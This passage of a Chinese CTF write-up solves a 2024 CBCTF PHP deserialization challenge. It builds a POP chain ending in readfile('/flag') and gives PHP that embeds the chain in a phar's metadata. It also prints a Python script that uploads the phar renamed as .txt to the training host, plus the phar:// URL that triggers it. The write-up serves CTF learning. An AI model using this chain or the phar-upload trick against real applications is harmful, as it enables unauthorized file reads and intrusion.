类中的魔术方法__get()：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">go</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ed_xinhu</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(lets::<span class="hljs-variable">$yolbby</span> === <span class="hljs-string">&quot;666&quot;</span>)&#123;<br>            <span class="hljs-comment">//当上一层级lets类变量$yolbby等于&quot;666&quot;时</span><br>            <span class="hljs-variable">$dilvey</span> = <span class="hljs-variable language_">$this</span> -&gt; ed_xinhu;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$dilvey</span>();<br>            <span class="hljs-comment">//变量$dilvey被作为函数调用，联想到lets类中的魔术方法__invoke()</span><br>            <span class="hljs-comment">//lets类的对象被当做函数调用时自动调用魔术方法__invoke()</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to win !&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>5.令 $ed_xinhu 为 lets 类来衔接 lets 类中的魔术方法__invoke()：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>        <span class="hljs-comment">//创建参数为$errmis的notes类新对象，自动调用notes类魔术方法__construct()</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>6.令 $errmis 为’&#x2F;flag’：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notes</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filepath</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-comment">//参数传递给$filepath即执行readfile(&#x27;/flag&#x27;)</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>7.综上构造链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ray</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">_0rays</span>();<br><span class="hljs-variable">$ray</span>-&gt;jbn = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br><span class="hljs-variable">$lets</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$lets</span>-&gt;mak4r1=<span class="hljs-string">&#x27;asc&#x27;</span>;<br><span class="hljs-comment">//$mak4r1--&gt;用md5加密--&gt;取倒数2~4位--&gt;$yolbby</span><br><span class="hljs-comment">//写个python脚本枚举出一个md5加密后密文满足&#x27;666&#x27;条件的字符串即可</span><br><span class="hljs-variable">$new_lets1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$go</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">go</span>();<br><span class="hljs-variable">$go</span>-&gt;ed_xinhu=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$go</span>-&gt;ed_xinhu-&gt;errmis=<span class="hljs-string">&#x27;/flag&#x27;</span>;<br><span class="hljs-variable">$new_lets1</span>-&gt;ech0=<span class="hljs-variable">$go</span>;<br><span class="hljs-variable">$lets</span>-&gt;rocket=<span class="hljs-variable">$new_lets1</span>;<br><span class="hljs-variable">$ray</span>-&gt;pankas=<span class="hljs-variable">$lets</span>;<br></code></pre></td></tr></table></figure><p>枚举用的 python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">input_string</span>):<br>    md5_hash = hashlib.md5()<br>    md5_hash.update(input_string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> md5_hash.hexdigest()<br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    input_string = <span class="hljs-built_in">chr</span>(randint(<span class="hljs-number">97</span>,<span class="hljs-number">122</span>))+<span class="hljs-built_in">chr</span>(randint(<span class="hljs-number">97</span>,<span class="hljs-number">122</span>))+<span class="hljs-built_in">chr</span>(randint(<span class="hljs-number">97</span>,<span class="hljs-number">122</span>))<br>    <span class="hljs-keyword">if</span> md5_hash(input_string)[-<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>]== <span class="hljs-string">&quot;666&quot;</span>:<br>        <span class="hljs-built_in">print</span>(input_string)<br>        <span class="hljs-built_in">print</span>(md5_hash(input_string))<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>各对象变量的结构图</p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/1.png"></p><h4 id="3-生成-phar-文件，上传并触发反序列化"><a href="#3-生成-phar-文件，上传并触发反序列化" class="headerlink" title="3.生成 phar 文件，上传并触发反序列化"></a>3.生成 phar 文件，上传并触发反序列化</h4><p>结合上面写好的在本地跑出 phar 文件并测试正确性，可以用小皮看一下效果，也可以 vscode 上配一下环境调试一下看看，加深反序列化攻击过程的理解。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// easy unserialize chain OuO</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notes</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filepath</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// flag in /flag , let&#x27;s go !!</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_0rays</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jbn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pankas</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span> -&gt; jbn))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable language_">$this</span> -&gt; pankas);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ha?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">go</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ed_xinhu</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(lets::<span class="hljs-variable">$yolbby</span> === <span class="hljs-string">&quot;666&quot;</span>)&#123;<br>            <span class="hljs-variable">$dilvey</span> = <span class="hljs-variable language_">$this</span> -&gt; ed_xinhu;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$dilvey</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to win !&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$filePath</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filePath</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$realPath</span> = <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$filePath</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$realPath</span>, <span class="hljs-string">&#x27;/notes&#x27;</span>) === <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listnote</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$directory</span> = <span class="hljs-string">&#x27;/notes&#x27;</span>; <br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$directory</span>), function (<span class="hljs-variable">$file</span>) <span class="hljs-keyword">use</span> ($<span class="hljs-title">directory</span>) &#123;<br>        <span class="hljs-title">return</span> <span class="hljs-title">is_file</span>(&quot;$<span class="hljs-title">directory</span>/$<span class="hljs-title">file</span>&quot;);<br>    &#125;);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>        <span class="hljs-variable">$link</span> = <span class="hljs-string">&#x27;&lt;a href=&quot;/index.php?note=/notes/&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$f</span>) . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$f</span>) . <span class="hljs-string">&#x27;&lt;/a&gt; &lt;p&gt;&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$link</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;/index.php?note=show-me-source&quot;&gt;show source&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// upload your own note ? (under development)</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;user_note&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> &amp;&amp; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)) === <span class="hljs-string">&#x27;txt&#x27;</span>) &#123;<br>        <span class="hljs-variable">$randomFileName</span> = <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>        <span class="hljs-variable">$targetFilePath</span> = <span class="hljs-string">&quot;/notes/&quot;</span> . <span class="hljs-variable">$randomFileName</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$targetFilePath</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your note successfully saved in :&quot;</span>.<span class="hljs-variable">$targetFilePath</span>;<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);   <br>&#125;<br><br><span class="hljs-variable">$note</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;note&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$note</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$note</span> === <span class="hljs-string">&quot;show-me-source&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$note</span>))&#123;<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/plain; charset=UTF-8&#x27;</span>);<br>            <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$note</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;这里是mak自己悄悄留给你的一些笔记哦，打开看看吧&lt;/h1&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;Notes List:&lt;h2&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">listnote</span>();<br>&#125;<br><br><span class="hljs-comment">//前面写好的链子</span><br><span class="hljs-variable">$ray</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">_0rays</span>();<br><span class="hljs-variable">$ray</span>-&gt;jbn = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br><span class="hljs-variable">$lets</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$lets</span>-&gt;mak4r1=<span class="hljs-string">&#x27;asc&#x27;</span>;<br><span class="hljs-variable">$new_lets1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$go</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">go</span>();<br><span class="hljs-variable">$go</span>-&gt;ed_xinhu=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$go</span>-&gt;ed_xinhu-&gt;errmis=<span class="hljs-string">&#x27;/flag&#x27;</span>;<br><span class="hljs-variable">$new_lets1</span>-&gt;ech0=<span class="hljs-variable">$go</span>;<br><span class="hljs-variable">$lets</span>-&gt;rocket=<span class="hljs-variable">$new_lets1</span>;<br><span class="hljs-variable">$ray</span>-&gt;pankas=<span class="hljs-variable">$lets</span>;<br><br><span class="hljs-comment">//生成phar文件</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);    <span class="hljs-comment">//删除之前的phar.phar文件(如果有)</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();            <span class="hljs-comment">//开始写文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);    <span class="hljs-comment">//写入stu头部信息</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$ray</span>);    <span class="hljs-comment">//重点！！将构造好的链子写入meta-data也就是manifest字段，这里会自动进行序列化，因此传入链头就行。其实可以理解为serialize（$o）;</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;phar.txt&quot;</span>, <span class="hljs-string">&quot;phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-comment">//本地测试</span><br><span class="hljs-comment">//$serialized = serialize($ray);//在本地序列化观察一下序列化的结果</span><br><span class="hljs-comment">//echo $serialized;</span><br><span class="hljs-comment">//unserialize($serialized);//可以在本地测试一下是否成功</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先根据源码文件上传部分的限制，修改 phar 文件的后缀变为 txt，然后用 python 发送文件到靶机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://e12a0360-5b3b-412a-a898-6edf2af3f94a.training.0rays.club:8001/&quot;</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;phar.txt&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>res = requests.post(url, files=&#123;<span class="hljs-string">&quot;user_note&quot;</span>:file&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p>上传成功返回上传文件的重命名名称，最后利用 phar 伪协议 <code>phar://</code> 访问文件触发反序列化即可</p><p><code>http://（靶机）/index.php?note=phar:///notes/（重命名的文件名.txt）</code></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/2.png"></p><h3 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h3><h4 id="1-没搞清楚对象的层次结构导致链子构造错误"><a href="#1-没搞清楚对象的层次结构导致链子构造错误" class="headerlink" title="1.没搞清楚对象的层次结构导致链子构造错误"></a>1.没搞清楚对象的层次结构导致链子构造错误</h4><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/3.png" alt="修改前"></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/4.png" alt="修改后"></p><h4 id="2-题目看错"><a href="#2-题目看错" class="headerlink" title="2.题目看错"></a>2.题目看错</h4><p>取倒数 2<del>4 位，搞成倒数 1</del>3 位，如上图 mak4r1 均取值错误</p><h4 id="3-使用-phar-伪协议触发反序列化错误"><a href="#3-使用-phar-伪协议触发反序列化错误" class="headerlink" title="3.使用 phar 伪协议触发反序列化错误"></a>3.使用 phar 伪协议触发反序列化错误</h4><p>错误 <code>http://（靶机）/index.php?note=phar://notes/（重命名的文件名.txt）</code></p><p>正确 <code>http://（靶机）/index.php?note=phar:///notes/（重命名的文件名.txt）</code></p><p><code>/notes/（重命名的文件名.txt）</code> 才是正确的文件路径，用 <code>phar://</code> 伪协议包含要反序列化的文件</p><h3 id="官方-WP"><a href="#官方-WP" class="headerlink" title="官方 WP"></a>官方 WP</h3><p><a href="https://0rays-club.feishu.cn/wiki/SoYjwHDSGixa12kk1RYcKQHKnpd">2024 CBCTF WriteUps</a></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/5.png"></p><h1 id="总结、感悟、收获"><a href="#总结、感悟、收获" class="headerlink" title="总结、感悟、收获"></a>总结、感悟、收获</h1><h2 id="1-如何理解链子的层层调用、对象的结构关系"><a href="#1-如何理解链子的层层调用、对象的结构关系" class="headerlink" title="1.如何理解链子的层层调用、对象的结构关系"></a>1.如何理解链子的层层调用、对象的结构关系</h2><p>既然叫链子，那么就要一环套一环，通过连续的自动调用来达到“利用原本无法利用的源码”的目的。然而，只有当前对象为包含某魔术方法的类的对象时，当前对象触发该魔术方法自动调用的条件，该魔术方法的自动调用才能生效。例如：_0rays 类下含有魔术方法__wakeup()，只有对象 ray 为_0rays 类时，对象 ray 